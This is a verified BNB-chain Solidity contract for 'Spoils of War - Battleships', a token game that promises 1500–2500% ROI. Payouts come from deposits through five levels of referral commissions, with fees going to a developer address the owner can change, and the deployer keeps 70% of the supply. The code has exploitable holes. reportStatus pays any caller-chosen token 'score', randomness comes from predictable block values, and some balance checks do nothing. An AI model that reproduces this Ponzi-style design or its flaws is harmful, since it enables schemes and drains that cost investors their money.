/**
 *Submitted for verification at BscScan.com on 2022-09-06
*/

// SPDX-License-Identifier: MIT License
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
      return _owner;
    }
    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract SpoilsOfWar is Context, Ownable, IBEP20 {
    using SafeMath for uint256;
	
	mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
	
    address payable public dev;  
      
    uint16 constant PERCENT_DIVIDER = 10000; 
    uint16[5] private ref_bonuses = [2500, 500, 300, 200, 100]; 

    uint256 public buys_bnb;
    uint256 public buys_token;

    uint256 public sells_bnb;
    uint256 public sells_token;
        
    uint256 public invest_bnb;
    uint256 public invest_token;
    
    uint256 public withdrawn;
    uint256 public ref_bonus;
    
    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Battle {
        uint40 timeStart;
        uint40 timeEnd;
        uint256 rewards;
        uint256 result;
        uint8 status;
    }

    struct Player {
        address upline;
        uint8 fleet; 
        uint256 dividends;        
        
        uint256 total_buy_bnb;
        uint256 total_buy_token;
        uint256 total_sell_bnb;
        uint256 total_sell_token;
        uint256 total_invest_token;
        uint256 total_refbonus;         
      
        uint40 lastWithdrawn;
        uint40 lastSwitched;
        
        Deposit[] deposits;
        Battle[] battles;
        uint256[5] structure;
        uint256[4] investments;        
    }
    
	mapping(address => Player) public players;
    mapping(uint256 => Tarif) public tarifs;
	    
    uint256 public nextMemberNo;
  	
	uint256 private constant DAY = 24 hours;
    //uint40 public dateLaunched;
    
    uint256[2] public fleet_crews 	    = [3000, 3000];
    
    uint256[2] public fleet_ships 		= [0, 0]; 
    uint256[2] public fleet_aircrafts 	= [0, 0]; 
    uint256[2] public fleet_admiral 	= [0, 0];
    
    uint256[2] public fleet_battles 	= [0, 0]; 
    
	uint256[2] public fleet_crewfactors = [0, 0];
    uint256[2] public fleet_shipfactors = [0, 0];
    uint256[2] public  fleet_excfactors  = [0, 0]; 
    uint256[2] public fleet_sellRates   = [1000000, 1000000]; 
    
    uint256 constant BUYRATE  =  100000;
    uint256 constant SELLRATE = 1000000;
	uint256 public tokenPromo = 110;

    constructor() {	    
        _name = "Spoils of War - Battleships";
        _symbol = "SOW";
        _decimals = 18;
        _totalSupply =  100000000000 * 10**uint(_decimals); // 100B
        
        _balances[address(this)] = 30000000000 * 10**uint(_decimals); 
		emit Transfer(address(0), address(this), _balances[address(this)]);    
		
        _balances[msg.sender] = 70000000000 * 10**uint(_decimals); 
		emit Transfer(address(0), msg.sender, _balances[msg.sender]);		
        
		tarifs[100]  = Tarif(100, 2500); //25.00% daily for 100 days => 2500% ROI
		tarifs[70]   = Tarif(70, 2100);  //30.00% daily for 70 days =>  2100% ROI
        tarifs[40]   = Tarif(40, 1600);  //40.00% daily for 40 days => 1600% ROI
        tarifs[30]   = Tarif(30, 1500);  //50.00% daily for 30 days => 1500% ROI
        
        dev = payable(msg.sender);		
        //dateLaunched = uint40(block.timestamp);
    }

    function BuyToken() public payable {
        require(msg.value >= 0.01 ether, "Minimum amount to sail is 0.01 BNB!");
        uint256 tokens = msg.value.mul(BUYRATE.mul(tokenPromo.div(100)));
        transferTokens(address(this), msg.sender, tokens);

        devSupport(msg.value,20);            

        Player storage player = players[msg.sender];        
        if(player.fleet > 0)
        {
            player.total_buy_bnb += msg.value;       
            player.total_buy_token += tokens;       
         
            fleet_ships[player.fleet-1] += SafeMath.div(msg.value, 0.2 ether);
            fleet_excfactors[player.fleet-1] += SafeMath.div(msg.value, 0.02 ether);   
            commissionPayouts(msg.sender, msg.value);
        }
        buys_token += tokens;
        buys_bnb += msg.value;
    }

	function SellToken(uint256 amount) external {   
        transferTokens(msg.sender, address(this), amount);
        Player storage player = players[msg.sender];    
        uint256 bnb;
        if(player.fleet > 0)
        {
            bnb = amount.div(fleet_sellRates[player.fleet-1] - fleet_excfactors[player.fleet-1]); 
            player.total_sell_bnb += bnb;
            player.total_sell_token += amount;
            
			uint256 eco = SafeMath.div(bnb, 0.1 ether);
        	fleet_shipfactors[player.fleet-1] += eco;
            fleet_sellRates[player.fleet-1] += SafeMath.div(bnb, 0.01 ether);    
        
		}else{
            bnb = amount.div(SELLRATE); 
        }

        payable(msg.sender).transfer(bnb);                
        sells_token += amount;
        sells_bnb += bnb;
        withdrawn += bnb;
    }
   
    function SignUp(address referral, uint8 fleet, uint8 quickinvest) public payable {
        require(msg.value >= 0.01 ether, "Minimum amount to start is 0.01 BNB!");

        Player storage player = players[msg.sender];
        require(player.fleet == 0, "Already a Member!");

        player.fleet = fleet;
        setUpline(msg.sender, referral, fleet);

        uint256 tokens = msg.value.mul(BUYRATE.mul(tokenPromo.div(100)));
      
        if(quickinvest > 0) {
            investToken(msg.sender, msg.value, tokens,100);
        }else{
            // hold the tokens
            transferTokens(address(this), msg.sender, tokens);
        }
            
        fleet_ships[fleet-1] += SafeMath.div(msg.value, 0.2 ether);
        fleet_excfactors[fleet-1] += SafeMath.div(msg.value, 0.02 ether);   

        devSupport(msg.value,10);     

        player.total_buy_bnb += msg.value;       
        player.total_buy_token += tokens;       
                
        buys_token += tokens;
        buys_bnb += msg.value;

        commissionPayouts(msg.sender, msg.value);
    }

    function UpgradeFleet(uint8 sector, uint256 tokens) external {
        require(tokens >= 500 ether,"Too small to invest!");         
        
        Player storage player = players[msg.sender];    
        transferTokens(msg.sender, address(this), tokens);
        
        uint256 bnb = tokens.div(BUYRATE); 
        uint256 tarif = 100;  
			
		if(sector==1) {
			//upgrade armaments
			tarif = 70;
            fleet_ships[player.fleet-1] += SafeMath.div(bnb, 0.2 ether);        
            fleet_admiral[player.fleet-1] += SafeMath.mul(bnb, 0.5 ether); 
		}else if(sector==2) {
            //upgrade armor
            tarif = 40;
            fleet_ships[player.fleet-1] += SafeMath.div(bnb, 0.15 ether);   
			fleet_admiral[player.fleet-1] += SafeMath.mul(bnb, 0.35 ether); 	
        }else if(sector==3) {
            //upgrade aircraft
            tarif = 30;
            fleet_aircrafts[player.fleet-1] += SafeMath.div(bnb, 0.1 ether);       
		    fleet_admiral[player.fleet-1] += SafeMath.mul(bnb, 0.2 ether);
		}		
		
		investToken(msg.sender, bnb, tokens, tarif);
        fleet_excfactors[player.fleet-1] += SafeMath.div(bnb, 0.02 ether);   
    }   
    
    function CollectDividends() external {
        Player storage player = players[msg.sender];
        if(this.whosWinning() != player.fleet){
            return;        
        }
        
        uint256 payout = this.computePayout(msg.sender);
        if(payout > 0) { 
            players[msg.sender].lastWithdrawn = uint40(block.timestamp);
            players[msg.sender].dividends += payout;
        }

        require(player.dividends > 0, "No Dividends Yet!");
        transferTokens(address(this), msg.sender, player.dividends);
        player.dividends = 0;
    }


    function SwitchAllegiance(uint8 fleet) public payable {
        require(msg.value >= 0.05 ether, "Minimum BNB to switch side is 0.05 BNB!");
        
        Player storage player = players[msg.sender];
        require (block.timestamp >= (player.lastSwitched + DAY), "Can switch sides after 24 hrs since your last!");
        
        uint256 tokens = msg.value.mul(BUYRATE.mul(tokenPromo.div(100)));
        transferTokens(address(this), msg.sender, tokens);
        
        if(fleet_crews[player.fleet-1] >=1){
            fleet_crews[player.fleet-1]--;
        }

        uint256 econ = SafeMath.div(SafeMath.mul(player.total_buy_bnb, 30), 100);
        fleet_shipfactors[player.fleet-1] += SafeMath.div(econ, 0.01 ether);
        
        player.fleet = fleet;

        fleet_ships[fleet-1] += (SafeMath.div(msg.value, 0.01 ether) + SafeMath.div(econ, 0.01 ether));

        devSupport(msg.value,10);     

        player.total_buy_bnb += msg.value;       
        player.total_buy_token += tokens;       
                
        buys_token += tokens;
        buys_bnb += msg.value;

        commissionPayouts(msg.sender, msg.value);

        player.lastSwitched = uint40(block.timestamp);
    }

	function startGame() external {
        //nextBattleNo++;
		Player storage player = players[msg.sender];		
		transferTokens(msg.sender, address(this), 10 ether);		
		uint256 r = rand(100);	
        player.battles.push(Battle({
            timeStart: uint40(block.timestamp),
            timeEnd: 0,
			rewards: 0,
			result: r,
			status: 0
		}));  				
	}
	
	function reportStatus(uint256 report, uint256 score) external {
		Player storage player = players[msg.sender];
		
		for(uint8 i = 0; i < player.battles.length; i++) {
            if(player.battles[i].status==0)
			{
				player.battles[i].timeEnd = uint40(block.timestamp);
				player.battles[i].status = 1;				
				if(player.battles[i].result <= 30 && report>0){
					player.battles[i].rewards = score;
					transferTokens(address(this), msg.sender, score);
				}
				fleet_battles[player.fleet-1]++;				
			}
        }
	}
	
    function investToken(address _addr, uint256 bnb, uint256 tokens, uint256 _tarif) private {
        Player storage player = players[_addr];
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: tokens,
            time: uint40(block.timestamp)
        }));  
        
        player.total_invest_token += tokens;
        
        if(_tarif==100){        
			player.investments[0] += bnb;
        }else if(_tarif==70){
            player.investments[1] += bnb;
        }else if(_tarif==40){
            player.investments[2] += bnb;
        }else if(_tarif==30){
            player.investments[3] += bnb;
        }
		
        invest_token += tokens;
        invest_bnb += bnb;
    }


    function devSupport(uint256 amount, uint256 perc) private {
        uint256 support = SafeMath.div(SafeMath.mul(amount, perc), 100);
        payable(dev).transfer(support); 
        withdrawn += support;          
    }


    function setUpline(address _addr, address _upline, uint8 fleet) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {
            nextMemberNo++;
            fleet_crews[fleet-1]++;
        
            if(_balances[_upline] <= 0) {
                _upline = owner();
            }
           
            players[_addr].upline = _upline;
           
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }          
        }
    }      
    
        
    function commissionPayouts(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            payable(up).transfer(bonus); 
            players[up].total_refbonus += bonus;

            ref_bonus += bonus;
            withdrawn += bonus;
			     
            up = players[up].upline;
        }
    }   
   
   
    function computePayout(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from;
            
            if(player.lastWithdrawn > player.lastSwitched){
                from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;
            }else{
                from = player.lastSwitched > dep.time ? player.lastSwitched : dep.time;
            }
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
        return value;
    }


    function memberInfo(address _addr) view external returns(uint256 for_withdraw, uint256 numDeposits, uint256 gamestatus, uint256[5] memory investments, uint256[5] memory structure) {       
        Player storage player = players[_addr];
        uint256 payout = this.computePayout(_addr);
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
        for(uint8 i = 0; i < 5; i++) {
            investments[i] = player.investments[i];
        }
		uint256 status;
		for(uint8 i = 0; i < player.battles.length; i++) {
            if(player.battles[i].status==0){
				status = player.battles[i].result;				
			}
        }
		
        return (payout + player.dividends, player.deposits.length, status, investments, structure);
    } 
    
    
    function memberDeposit(address _addr, uint256 index) view external returns(uint40 time, uint256 amount, uint256 lifedays, uint256 percent)
    {
        Player storage player = players[_addr];
        Deposit storage dep = player.deposits[index];
        Tarif storage tarif = tarifs[dep.tarif];
        return(dep.time, dep.amount, tarif.life_days, tarif.percent);
    }
    

    function transferTokens(address _from, address _to, uint256 amount) private {
        require(_balances[_from].sub(amount) >= 0,"Not enough tokens!");        
        _balances[_to] = _balances[_to].add(amount);
        _balances[_from] = _balances[_from].sub(amount);
        emit Transfer(_from, _to, amount);
    }


    function whosWinning() view external returns(uint8 winner) {
        uint256[2] memory percentages;
        
        uint256 mx2 = getHighest(addFactors(fleet_ships[0], fleet_shipfactors[0]), addFactors(fleet_ships[1], fleet_shipfactors[1]));        
        percentages[0] += getPercentile(addFactors(fleet_ships[0], fleet_shipfactors[0]),mx2, 40); 
        percentages[1] += getPercentile(addFactors(fleet_ships[1], fleet_shipfactors[1]),mx2, 40); 
        
        uint256 mx4 = getHighest(fleet_aircrafts[0],fleet_aircrafts[1]);
        percentages[0] += getPercentile(fleet_aircrafts[0],mx4, 35); 
        percentages[1] += getPercentile(fleet_aircrafts[1],mx4, 35); 
        
        uint256 mx3 = getHighest(fleet_admiral[0],fleet_admiral[1]);
        percentages[0] += getPercentile(fleet_admiral[0],mx3, 25); 
        percentages[1] += getPercentile(fleet_admiral[1],mx3, 25); 
        
        
        if(percentages[0] >= percentages[1]){
            return 1;
        }else {
			return 2;
        }        
    }
    

    function getHighest(uint256 a, uint256 b) pure private returns(uint256 value) {        
        if(a >= b){
            return a;
        }else{
            return b;    
        }        
    }

    function getPercentile(uint256 a, uint256 h, uint256 p) pure private returns(uint256 value) {
        if(a == 0 || h == 0) { return 0; }
        return ((a / h * 100) * p) / 100;
    }

   
    function addFactors(uint256 a, uint256 b) pure private returns(uint256 value) {
        if(a - b >= 0){
            return(a-b);
        }
        return 0;
    }


    function rand(uint256 max) public view returns(uint256)
    {
        uint256 seed = uint256(keccak256(abi.encodePacked(
            block.timestamp + block.difficulty +
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (block.timestamp)) +
            block.gaslimit + 
            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (block.timestamp)) +
            block.number
        )));
        return (seed - ((seed / max) * max));
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    function setDev(address newval) public onlyOwner returns (bool success) {
        dev = payable(newval);
        return true;
    }  
 
	function setPromo(uint256 val) public onlyOwner returns (bool success) {
        tokenPromo = val;
        return true;
    }  
	
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }

}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}